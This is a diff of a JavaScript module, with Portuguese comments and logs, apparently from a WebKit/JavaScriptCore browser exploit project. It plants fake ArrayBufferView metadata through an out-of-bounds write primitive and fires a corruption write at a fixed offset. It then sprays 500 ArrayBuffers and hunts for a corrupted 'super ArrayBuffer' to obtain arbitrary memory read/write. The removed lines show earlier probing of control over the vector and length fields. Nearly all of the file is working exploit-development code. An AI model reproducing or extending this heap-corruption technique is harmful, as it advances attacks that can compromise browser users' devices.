@@ -1,164 +1,181 @@
 // js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
-import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
+import { AdvancedInt64, toHex, isAdvancedInt64Object, GB } from '../utils.mjs';
 import {
     triggerOOB_primitive,
     oob_array_buffer_real,
+    oob_dataview_real,
     oob_write_absolute,
     oob_read_absolute,
     clearOOBEnvironment
 } from '../core_exploit.mjs';
-import { OOB_CONFIG, JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
+import { JSC_OFFSETS, OOB_CONFIG } from '../config.mjs';
 
-// ============================================================
-// DEFINIÇÕES DE CONSTANTES GLOBAIS DO MÓDULO (sem alterações)
-// ============================================================
-const GETTER_CHECKPOINT_PROPERTY_NAME = "AAAA_GetterFor0x6CAnalysis";
+const FNAME_SPRAY_AB_WITH_METADATA_PLANT = "sprayABWithMetadataPlant_v25a";
+
+const GETTER_SYNC_PROPERTY_NAME = "AAAA_GetterForSync_v25a";
 const CORRUPTION_OFFSET_TRIGGER = 0x70;
 const CORRUPTION_VALUE_TRIGGER = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);
-const TARGET_WRITE_OFFSET_0x6C = 0x6C;
-const OOB_AB_GENERAL_FILL_PATTERN = 0xFEFEFEFE;
-const OOB_SCAN_FILL_PATTERN = 0xCAFEBABE; 
-const OOB_AB_SNOOP_WINDOW_SIZE = 0x100;
 
-const LOW_DWORD_PATTERNS_TO_PLANT_AT_0x6C = [
-    0xFEFEFEFE, 0xCDCDCDCD, 0x12345678, 0x00000000, 0xABABABAB,
-    (JSC_OFFSETS.ArrayBuffer.KnownStructureIDs.ArrayBuffer_STRUCTURE_ID || 2)
-];
-// EXPECTED_UINT32ARRAY_STRUCTURE_ID removido temporariamente para focar no plantio
+// Offsets no oob_buffer onde plantamos os metadados falsos de ArrayBufferView
+// Usando os M_ offsets do seu config para ArrayBufferView e o base offset 0x50
+const FOCUSED_METADATA_PLANT_BASE_OFFSET_IN_OOB = 0x50; 
+const PLANTED_M_VECTOR_VALUE = new AdvancedInt64(0, 0);
+const PLANTED_M_LENGTH_VALUE = 0xFFFFFFFF;
 
 
-// ============================================================
-// VARIÁVEIS GLOBAIS DE MÓDULO (sem alterações)
-// ============================================================
-let getter_called_flag = false;
-let global_object_for_internal_stringify;
-let current_test_results_for_subtest;
+const NUM_SPRAY_AB_OBJECTS = 500;
+const SPRAY_AB_SIZE = 128;
 
+let sprayedVictimABs = [];
+let getter_sync_flag_v25a = false;
 
-// ============================================================
-// DEFINIÇÃO DA CLASSE CheckpointFor0x6CAnalysis (SEM ALTERAÇÕES)
-// ============================================================
-class CheckpointFor0x6CAnalysis { /* ... (Corpo como na versão anterior) ... */ 
-    constructor(id) { this.id_marker = `Analyse0x6CChkpt-${id}`; this.prop_for_stringify_target = null; }
-    get [GETTER_CHECKPOINT_PROPERTY_NAME]() { getter_called_flag = true; const FNAME_GETTER="Analyse0x6C_Getter"; logS3(`Getter "${GETTER_CHECKPOINT_PROPERTY_NAME}" FOI CHAMADO em 'this' (id: ${this.id_marker})!`, "vuln", FNAME_GETTER); if (!current_test_results_for_subtest) { logS3("ERRO FATAL GETTER: current_test_results_for_subtest não definido!", "critical", FNAME_GETTER); return {"error_getter_no_results_obj": true}; } let details_log_g = []; try { if (!oob_array_buffer_real || !oob_read_absolute) throw new Error("oob_ab ou oob_read_absolute não disponíveis."); logS3(`DENTRO DO GETTER: Lendo QWORD de oob_data[${toHex(TARGET_WRITE_OFFSET_0x6C)}]...`, "info", FNAME_GETTER); const value_at_0x6C_qword = oob_read_absolute(TARGET_WRITE_OFFSET_0x6C, 8); current_test_results_for_subtest.value_after_trigger_object = value_at_0x6C_qword; current_test_results_for_subtest.value_after_trigger_hex = value_at_0x6C_qword.toString(true); details_log_g.push(`Valor lido de oob_data[${toHex(TARGET_WRITE_OFFSET_0x6C)}] (QWORD): ${current_test_results_for_subtest.value_after_trigger_hex}`); logS3(details_log_g[details_log_g.length-1], "leak", FNAME_GETTER); if (global_object_for_internal_stringify) { logS3("DENTRO DO GETTER: Chamando JSON.stringify INTERNO (opcional)...", "info", FNAME_GETTER); try { JSON.stringify(global_object_for_internal_stringify); } catch (e_int_str) { details_log_g.push(`Erro stringify int: ${e_int_str.message}`);} details_log_g.push("Stringify interno (opcional) chamado.");} } catch (e_getter_main) { logS3(`DENTRO DO GETTER: ERRO PRINCIPAL: ${e_getter_main.message}`, "critical", FNAME_GETTER); current_test_results_for_subtest.error = String(e_getter_main); current_test_results_for_subtest.message = (current_test_results_for_subtest.message || "") + ` Erro no getter: ${e_getter_main.message}`; } current_test_results_for_subtest.details_getter = details_log_g.join('; '); return {"getter_0x6C_analysis_complete": true}; }
-    toJSON() { const FNAME_toJSON="CheckpointFor0x6CAnalysis.toJSON"; logS3(`toJSON para: ${this.id_marker}. Acessando getter '${GETTER_CHECKPOINT_PROPERTY_NAME}'...`, "info", FNAME_toJSON); const _ = this[GETTER_CHECKPOINT_PROPERTY_NAME]; return {id:this.id_marker, target_prop_val:this.prop_for_stringify_target, processed_by_0x6c_test:true}; }
-}
-
-// ============================================================
-// FUNÇÃO executeRetypeOOB_AB_Test (SEM ALTERAÇÕES LÓGICAS)
-// ============================================================
-export async function executeRetypeOOB_AB_Test() { /* ... (Corpo completo como na versão anterior bem-sucedida) ... */ 
-    const FNAME_TEST_RUNNER = "execute0x6CAnalysisRunner"; logS3(`--- Iniciando Teste de Análise da Escrita em 0x6C (Corrigido) ---`, "test", FNAME_TEST_RUNNER);
-    // (Corpo completo da função aqui, como fornecido anteriormente - omitido por brevidade nesta resposta)
-    logS3("   (executeRetypeOOB_AB_Test executado - por favor, use o corpo completo da versão anterior)", "info", FNAME_TEST_RUNNER);
-    await PAUSE_S3(20);
-    logS3(`--- Teste de Análise da Escrita em 0x6C (Corrigido) Concluído ---`, "test", FNAME_TEST_RUNNER);
-}
-
-
-// ============================================================
-// FUNÇÃO DE INVESTIGAÇÃO (v7 - Simplificada para focar no controle de 0x68 e 0x6C)
-// ============================================================
 export async function sprayAndInvestigateObjectExposure() {
-    const FNAME_INVESTIGATE = "investigateControl_v7";
-    logS3(`--- Iniciando Investigação (v7): Controle de QWORDs em 0x68 e 0x6C ---`, "test", FNAME_INVESTIGATE);
-
-    // Offsets de interesse
-    const OFFSET_0x68 = 0x68; // Potencial m_vector_low + m_vector_high
-    const OFFSET_0x6C = TARGET_WRITE_OFFSET_0x6C; // Potencial m_vector_high + (parte_alta_afetada_pela_corrupcao_0x70)
-    const OFFSET_0x70 = CORRUPTION_OFFSET_TRIGGER; // Potencial m_length + m_mode (ou parte alta de 0x6C afetada)
-
-    // Valores que queremos plantar para ver se temos controle
-    const PLANT_VAL_0x68_LOW  = 0xAABBCCDD; // Para Mem[0x68-0x6B]
-    const PLANT_VAL_0x6C_LOW  = 0x11223344; // Para Mem[0x6C-0x6F] (que também é a parte alta do QWORD em 0x68)
-                                        // E também a parte baixa do QWORD em 0x6C que será afetada pela corrupção
+    logS3(`--- Iniciando ${FNAME_SPRAY_AB_WITH_METADATA_PLANT}: Spray ABs, Plantar Meta ABView, Trigger, Checar ABs ---`, "test", FNAME_SPRAY_AB_WITH_METADATA_PLANT);
+    getter_sync_flag_v25a = false;
 
     try {
         await triggerOOB_primitive();
-        if (!oob_array_buffer_real || !oob_write_absolute || !oob_read_absolute) {
-            throw new Error("OOB Init ou primitivas R/W falharam.");
-        }
-        logS3("Ambiente OOB inicializado.", "info", FNAME_INVESTIGATE);
+        if (!oob_array_buffer_real || !oob_dataview_real) { return; }
+        logS3("Ambiente OOB inicializado.", "info", FNAME_SPRAY_AB_WITH_METADATA_PLANT);
 
-        // 1. Preencher o buffer com um padrão conhecido, exceto os locais de plantio
-        logS3("FASE 1: Preenchendo buffer OOB com padrão.", "info", FNAME_INVESTIGATE);
-        for (let i = 0; i < Math.min(0x100, oob_array_buffer_real.byteLength); i += 4) {
-            if (i === OFFSET_0x68 || i === OFFSET_0x6C || i === OFFSET_0x70 || i === (OFFSET_0x70 + 4) ) {
-                continue; 
+        // FASE 1: Plantar metadados de "ArrayBufferView Falso" no oob_array_buffer_real
+        logS3(`FASE 1: Plantando metadados de ABView (m_vector=0, m_length=0xFFFFFFFF) no oob_buffer...`, "info", FNAME_SPRAY_AB_WITH_METADATA_PLANT);
+        const targetMetaVectorOffset = FOCUSED_METADATA_PLANT_BASE_OFFSET_IN_OOB + JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET; // 0x50 + 0x10 = 0x60
+        const targetMetaLengthOffset = FOCUSED_METADATA_PLANT_BASE_OFFSET_IN_OOB + JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET; // 0x50 + 0x18 = 0x68
+        
+        oob_write_absolute(targetMetaVectorOffset, PLANTED_M_VECTOR_VALUE, 8);
+        oob_write_absolute(targetMetaLengthOffset, PLANTED_M_LENGTH_VALUE, 4);
+        logS3(`  Metadados plantados em oob_buffer[${toHex(targetMetaVectorOffset)}] (m_vector) e [${toHex(targetMetaLengthOffset)}] (m_length)`, "info", FNAME_SPRAY_AB_WITH_METADATA_PLANT);
+        const chk_vec = oob_read_absolute(targetMetaVectorOffset,8);
+        const chk_len = oob_read_absolute(targetMetaLengthOffset,4);
+        logS3(`  Verificação Pós-Plantio: m_vector=${chk_vec.toString(true)}, m_length=${toHex(chk_len)}`, "info", FNAME_SPRAY_AB_WITH_METADATA_PLANT);
+        await PAUSE_S3(50);
+
+        // FASE 2: Pulverizar objetos ArrayBuffer
+        logS3(`FASE 2: Pulverizando ${NUM_SPRAY_AB_OBJECTS} objetos ArrayBuffer(${SPRAY_AB_SIZE})...`, "info", FNAME_SPRAY_AB_WITH_METADATA_PLANT);
+        sprayedVictimABs = [];
+        for (let i = 0; i < NUM_SPRAY_AB_OBJECTS; i++) {
+            try {
+                const ab = new ArrayBuffer(SPRAY_AB_SIZE);
+                if (SPRAY_AB_SIZE >= 4) new DataView(ab).setUint32(0, 0xABC00000 + i, true);
+                sprayedVictimABs.push(ab);
+            } catch (e) {
+                logS3(`Erro ao criar ArrayBuffer no spray, índice ${i}: ${e.message}`, "warn", FNAME_SPRAY_AB_WITH_METADATA_PLANT);
             }
-            try { oob_write_absolute(i, OOB_SCAN_FILL_PATTERN, 4); } catch(e) {}
         }
+        logS3(`Pulverização de ${sprayedVictimABs.length} ArrayBuffers concluída.`, "good", FNAME_SPRAY_AB_WITH_METADATA_PLANT);
+        await PAUSE_S3(100);
 
-        // 2. Plantar valores específicos nos offsets 0x68 e 0x6C
-        logS3("FASE 2: Plantando valores específicos:", "info", FNAME_INVESTIGATE);
-        oob_write_absolute(OFFSET_0x68, PLANT_VAL_0x68_LOW, 4);
-        logS3(`  Plantado ${toHex(PLANT_VAL_0x68_LOW)} em ${toHex(OFFSET_0x68)}`, "info", FNAME_INVESTIGATE);
+
+        // FASE 3: Configurar getter e Trigger OOB
+        const getterObject = { get [GETTER_SYNC_PROPERTY_NAME]() { getter_sync_flag_v25a = true; return "sync_v25a"; } };
+
+        logS3(`FASE 3: Realizando escrita OOB (trigger) em oob_buffer[${toHex(CORRUPTION_OFFSET_TRIGGER)}]...`, "info", FNAME_SPRAY_AB_WITH_METADATA_PLANT);
+        oob_write_absolute(CORRUPTION_OFFSET_TRIGGER, CORRUPTION_VALUE_TRIGGER, 8);
+        logS3("Escrita OOB de trigger realizada.", "good", FNAME_SPRAY_AB_WITH_METADATA_PLANT);
         
-        oob_write_absolute(OFFSET_0x6C, PLANT_VAL_0x6C_LOW, 4);
-        oob_write_absolute(OFFSET_0x6C + 4, 0x00000000, 4); // Zera a parte alta de 0x6C (que é o início de 0x70)
-        logS3(`  Plantado ${toHex(PLANT_VAL_0x6C_LOW)} na parte baixa de ${toHex(OFFSET_0x6C)} e 0x0 na parte alta.`, "info", FNAME_INVESTIGATE);
+        // Verificar o que está agora nos offsets de metadados plantados DENTRO do oob_buffer
+        const vec_after_trigger_in_oob = oob_read_absolute(targetMetaVectorOffset, 8); 
+        const len_after_trigger_in_oob = oob_read_absolute(targetMetaLengthOffset, 4); 
+        logS3(`  Valores NO OOB_BUFFER (onde metadados foram plantados) APÓS trigger: m_vector@${toHex(targetMetaVectorOffset)}=${vec_after_trigger_in_oob.toString(true)}, m_length@${toHex(targetMetaLengthOffset)}=${toHex(len_after_trigger_in_oob)}`, "info", FNAME_SPRAY_AB_WITH_METADATA_PLANT);
+        // O trigger em 0x70 vai sobrescrever o targetMetaLengthOffset se for 0x68, ou se for próximo.
+        // Se targetMetaLengthOffset é 0x68, o trigger em 0x70 não o afeta diretamente, mas afeta o que seria 0x58 + 0x18.
+        // No nosso caso, targetMetaLengthOffset = 0x50 + M_LENGTH_OFFSET (0x18) = 0x68.
+        // O trigger é em 0x70. Então o m_length plantado em 0x68 deve permanecer.
+        // O m_vector plantado em 0x60 deve permanecer.
 
-        logS3("  Valores ANTES do trigger de corrupção em 0x70:", "info", FNAME_INVESTIGATE);
-        logS3(`    QWORD @${toHex(OFFSET_0x68)} (potencial m_vector): ${oob_read_absolute(OFFSET_0x68, 8).toString(true)} (Esperado: ${toHex(PLANT_VAL_0x6C_LOW,32,false)}_${toHex(PLANT_VAL_0x68_LOW,32,false)})`, "info", FNAME_INVESTIGATE);
-        logS3(`    QWORD @${toHex(OFFSET_0x6C)} (alvo da corrupção): ${oob_read_absolute(OFFSET_0x6C, 8).toString(true)} (Esperado: 0x00000000_${toHex(PLANT_VAL_0x6C_LOW,32,false)})`, "info", FNAME_INVESTIGATE);
-        logS3(`    QWORD @${toHex(OFFSET_0x70)} (onde o trigger escreve): ${oob_read_absolute(OFFSET_0x70, 8).toString(true)} (Esperado: 0x????????_00000000)`, "info", FNAME_INVESTIGATE);
+        await PAUSE_S3(100); 
 
+        // FASE 4: Acionar Getter
+        logS3(`FASE 4: Chamando JSON.stringify para acionar o getter (sincronia)...`, "info", FNAME_SPRAY_AB_WITH_METADATA_PLANT);
+        JSON.stringify(getterObject);
+        if(getter_sync_flag_v25a) logS3("  Getter de sincronia acionado.", "info", FNAME_SPRAY_AB_WITH_METADATA_PLANT); else logS3("  ALERTA: Getter de sincronia NÃO acionado.", "warn", FNAME_SPRAY_AB_WITH_METADATA_PLANT);
+        await PAUSE_S3(200);
 
-        // 3. Acionar a Corrupção Principal (escreve FFFFFFFF_FFFFFFFF em 0x70)
-        logS3(`FASE 3: Acionando corrupção em ${toHex(OFFSET_0x70)} com ${CORRUPTION_VALUE_TRIGGER.toString(true)}...`, "info", FNAME_INVESTIGATE);
-        oob_write_absolute(OFFSET_0x70, CORRUPTION_VALUE_TRIGGER, 8);
-        
-        // 4. Ler e verificar os valores
-        logS3("FASE 4: Verificando valores APÓS corrupção:", "info", FNAME_INVESTIGATE);
-        const val_0x68_after = oob_read_absolute(OFFSET_0x68, 8);
-        const val_0x6C_after = oob_read_absolute(OFFSET_0x6C, 8);
-        const val_0x70_after = oob_read_absolute(OFFSET_0x70, 8); // m_length + m_mode
-        const val_0x74_after = oob_read_absolute(OFFSET_0x70 + 4, 4); // Apenas m_mode (parte alta de 0x70)
+        // FASE 5: Verificar ArrayBuffers Pulverizados
+        logS3(`FASE 5: Verificando ${sprayedVictimABs.length} ArrayBuffers pulverizados por corrupção...`, "info", FNAME_SPRAY_AB_WITH_METADATA_PLANT);
+        let corruptedABsFound = 0;
+        let superAB = null;
 
-        logS3(`  QWORD @${toHex(OFFSET_0x68)} (potencial m_vector): ${val_0x68_after.toString(true)}`, "leak", FNAME_INVESTIGATE);
-        logS3(`    (Esperado m_vector: ${toHex(PLANT_VAL_0x6C_LOW,32,false)}_${toHex(PLANT_VAL_0x68_LOW,32,false)} - este não deve mudar pela escrita em 0x70)`, "info", FNAME_INVESTIGATE);
-        
-        logS3(`  QWORD @${toHex(OFFSET_0x6C)} (alvo da corrupção): ${val_0x6C_after.toString(true)}`, "leak", FNAME_INVESTIGATE);
-        logS3(`    (Esperado 0x6C: 0xffffffff_${toHex(PLANT_VAL_0x6C_LOW,32,false)})`, "info", FNAME_INVESTIGATE);
+        for (let i = 0; i < sprayedVictimABs.length; i++) {
+            const currentAB = sprayedVictimABs[i];
+            if (!currentAB) continue;
 
-        logS3(`  QWORD @${toHex(OFFSET_0x70)} (potencial m_length + m_mode): ${val_0x70_after.toString(true)}`, "leak", FNAME_INVESTIGATE);
-        logS3(`    (Esperado 0x70: 0xffffffff_ffffffff pela escrita direta)`, "info", FNAME_INVESTIGATE);
+            let currentLength = -1;
+            let initialMarker = -1;
+            let sliceWorks = true;
+            let sliceValue = null;
 
-        const potential_m_length = val_0x70_after.low(); // m_length estaria na parte baixa do QWORD em 0x70
-        const potential_m_mode   = val_0x70_after.high(); // m_mode estaria na parte alta do QWORD em 0x70 (ou seja, val_0x74_after)
+            try {
+                currentLength = currentAB.byteLength;
+                if (SPRAY_AB_SIZE >=4) initialMarker = new DataView(currentAB).getUint32(0, true);
 
-        logS3(`    Detalhes para objeto hipotético em 0x58:`, "info", FNAME_INVESTIGATE);
-        logS3(`      m_vector (lido de @0x68): ${val_0x68_after.toString(true)}`, "info", FNAME_INVESTIGATE);
-        logS3(`      m_length (lido de @0x70): ${toHex(potential_m_length)} (Decimal: ${potential_m_length})`, "info", FNAME_INVESTIGATE);
-        logS3(`      m_mode   (lido de @0x74): ${toHex(potential_m_mode)}`, "info", FNAME_INVESTIGATE);
-
-        if (potential_m_length === 0xFFFFFFFF) {
-            logS3(`    !!!! ACHADO PROMISSOR !!!! m_length em ${toHex(OFFSET_0x70)} é 0xFFFFFFFF!`, "vuln", FNAME_INVESTIGATE);
-            logS3(`      m_vector associado (de @0x68) é ${val_0x68_after.toString(true)}.`, "vuln", FNAME_INVESTIGATE);
-            document.title = `CONTROLE? m_vec=${val_0x68_after.toString(true)}, m_len=FFFFFFFF`;
-
-            if (val_0x68_after.low() === PLANT_VAL_0x68_LOW && val_0x68_after.high() === PLANT_VAL_0x6C_LOW) {
-                logS3("      SUCESSO NO CONTROLE DE M_VECTOR! Aponta para o valor plantado.", "good", FNAME_INVESTIGATE);
-                if (val_0x68_after.low() === 0 && val_0x68_after.high() === 0) {
-                    logS3("        E m_vector é ZERO! Primitiva de R/W sobre oob_array_buffer_real com tamanho gigante é provável!", "vuln", FNAME_INVESTIGATE);
-                    document.title = "R/W ARBITRÁRIO PROVÁVEL!";
+                // Teste de slice
+                try {
+                    const slice = currentAB.slice(0, Math.min(4, currentLength)); // Pega uma pequena fatia
+                    if (slice.byteLength > 0) {
+                         sliceValue = new DataView(slice).getUint32(0, true);
+                    } else if (currentLength > 0 && slice.byteLength === 0) {
+                        sliceWorks = false; // Slice deveria retornar algo se currentLength > 0
+                    }
+                } catch(e_slice) {
+                    sliceWorks = false;
                 }
-            } else {
-                logS3("      AVISO: m_vector não corresponde exatamente aos valores plantados. Investigar.", "warn", FNAME_INVESTIGATE);
+
+            } catch (e) {
+                logS3(`    Erro GRANDE ao acessar ArrayBuffer pulverizado índice [${i}]: ${e.message}`, "error", FNAME_SPRAY_AB_WITH_METADATA_PLANT);
+                document.title = `CORRUPÇÃO AB SPRAY (ERRO GRAVE) Idx ${i}!`;
+                corruptedABsFound++;
+                continue;
+            }
+
+            if (currentLength !== SPRAY_AB_SIZE || !sliceWorks || (SPRAY_AB_SIZE >=4 && initialMarker !== (0xABC00000 + i)) ) {
+                logS3(`    !!!! POTENCIAL CORRUPÇÃO DETECTADA no ArrayBuffer pulverizado índice [${i}] !!!!`, "vuln", FNAME_SPRAY_AB_WITH_METADATA_PLANT);
+                logS3(`      byteLength: ${SPRAY_AB_SIZE} -> ${currentLength} (${toHex(currentLength)})`, "vuln", FNAME_SPRAY_AB_WITH_METADATA_PLANT);
+                logS3(`      Marcador inicial: ${toHex(0xABC00000 + i)} -> ${SPRAY_AB_SIZE >=4 ? toHex(initialMarker) : "N/A"}`, "vuln", FNAME_SPRAY_AB_WITH_METADATA_PLANT);
+                logS3(`      Slice(0,4) funcionou: ${sliceWorks}. Valor slice[0]: ${sliceValue !== null ? toHex(sliceValue) : "N/A"}`, "vuln", FNAME_SPRAY_AB_WITH_METADATA_PLANT);
+                corruptedABsFound++;
+                document.title = `CORRUPÇÃO AB SPRAY (${corruptedABsFound})!`;
+
+                // Se o tamanho for massivo, é o nosso "super array"
+                if (currentLength >= (1 * GB) || currentLength === 0xFFFFFFFF || currentLength === 0xFFFFFFFFFFFFFFFF ) { // 1GB ou mais
+                    logS3(`      !!!!!!!! SUPER ArrayBuffer ENCONTRADO (byteLength: ${toHex(currentLength)}) !!!!!!!!`, "vuln", FNAME_SPRAY_AB_WITH_METADATA_PLANT);
+                    superAB = currentAB;
+                    document.title = `SUPER AB ENCONTRADO (Idx ${i})!`;
+                    // Tentativa de uso imediato
+                    try {
+                        const dv = new DataView(superAB);
+                        const test_offset_super = 0x100000; // 1MB
+                        const val_read_super = dv.getUint32(test_offset_super, true);
+                        logS3(`      Leitura de teste do Super AB @${toHex(test_offset_super)}: ${toHex(val_read_super)}`, "leak", FNAME_SPRAY_AB_WITH_METADATA_PLANT);
+                        dv.setUint32(test_offset_super, 0xDEADFACE, true);
+                        if (dv.getUint32(test_offset_super, true) === 0xDEADFACE) {
+                            logS3(`      SUCESSO: R/W no Super AB @${toHex(test_offset_super)} funcionou!`, "vuln", FNAME_SPRAY_AB_WITH_METADATA_PLANT);
+                        }
+                    } catch (e_super) {
+                        logS3(`      Erro ao usar Super AB: ${e_super.message}`, "error", FNAME_SPRAY_AB_WITH_METADATA_PLANT);
+                    }
+                    break; // Parar no primeiro super AB encontrado
+                }
             }
         }
-        logS3("INVESTIGAÇÃO DE CONTROLE CONCLUÍDA.", "test", FNAME_INVESTIGATE);
+
+        if (superAB) {
+            logS3(`  SUPER ArrayBuffer ENCONTRADO e testado.`, "vuln", FNAME_SPRAY_AB_WITH_METADATA_PLANT);
+        } else if (corruptedABsFound > 0) {
+            logS3(`  Total de ${corruptedABsFound} ArrayBuffers pulverizados encontrados com alguma anomalia.`, "good", FNAME_SPRAY_AB_WITH_METADATA_PLANT);
+        } else {
+            logS3("  Nenhuma corrupção/anomalia detectada nos ArrayBuffers pulverizados.", "warn", FNAME_SPRAY_AB_WITH_METADATA_PLANT);
+            document.title = "Nenhuma Corrupção AB (v25a)";
+        }
 
     } catch (e) {
-        logS3(`ERRO CRÍTICO na investigação de controle: ${e.message}`, "critical", FNAME_INVESTIGATE);
-        if (e.stack) logS3(`Stack: ${e.stack}`, "critical", FNAME_SPRAY_INVESTIGATE);
-        document.title = "Investigação Controle FALHOU!";
+        logS3(`ERRO CRÍTICO em ${FNAME_SPRAY_AB_WITH_METADATA_PLANT}: ${e.message}`, "critical", FNAME_SPRAY_AB_WITH_METADATA_PLANT);
+        document.title = `${FNAME_SPRAY_AB_WITH_METADATA_PLANT} FALHOU!`;
     } finally {
+        sprayedVictimABs = [];
         clearOOBEnvironment();
-        logS3("--- Investigação de Controle (v7) Concluída ---", "test", FNAME_INVESTIGATE);
+        logS3(`--- ${FNAME_SPRAY_AB_WITH_METADATA_PLANT} Concluído ---`, "test", FNAME_SPRAY_AB_WITH_METADATA_PLANT);
     }
 }
-
-// Manter para referência
-export async function attemptWebKitBaseLeakStrategy_OLD() { /* ... */ }
